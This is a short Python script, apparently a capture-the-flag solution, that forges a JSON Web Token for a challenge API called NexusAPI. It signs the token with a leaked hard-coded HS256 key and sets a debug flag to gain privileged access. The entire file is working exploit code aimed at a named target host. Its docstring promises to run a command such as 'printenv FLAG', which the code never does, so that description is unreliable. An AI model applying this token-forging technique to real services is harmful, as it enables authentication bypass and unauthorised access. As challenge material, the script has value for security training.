#!/usr/bin/env python3
"""
NexusAPI - JWT forger
Vulnerability: hard-coded / leaked HS256 signing key -> forge token with debug:true
Usage: python3 forge_jwt.py [command]   (default command: printenv FLAG)
"""
import base64, hashlib, hmac, json, sys, time

TARGET = "https://kicyber-99c62d67faa0-nexusapi-0-0.chals.io"
SECRET = b"y0u_f0und_th3_k3y"          # leaked from /api/v1/user/source


def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def forge(debug=True):
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "sub": "test@test.com",
        "guid": "9bb6f1c8-45de-44ab-a0e7-508af4769b8b",
        "debug": debug,               # <-- the whole point
        "exp": int(time.time()) + 3600,
    }
    h = b64e(json.dumps(header, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64e(hmac.new(SECRET, f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


if __name__ == "__main__":
    print(forge())
